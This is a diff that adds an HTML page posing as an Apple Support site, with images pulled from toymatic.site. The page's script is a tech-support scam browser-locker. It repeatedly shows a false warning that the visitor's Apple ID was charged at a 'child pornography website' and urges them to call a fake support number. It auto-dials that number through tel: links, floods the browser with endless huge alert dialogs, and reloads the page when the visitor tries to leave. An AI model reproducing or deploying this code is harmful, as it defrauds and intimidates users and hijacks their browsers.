+  gtag('config', 'G-PH1QTWEN1J');
 </script>
+
+</head>
+<!-- Google tag (gtag.js) -->
+
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-513-6968 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="https://toymatic.site/globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="https://toymatic.site/globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-877-513-6968
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-513-6968');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-513-6968"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPHY WEBSITE for $149.00 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support1 +1 877-513-6968 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
 </body>
+
+
+
 </html>
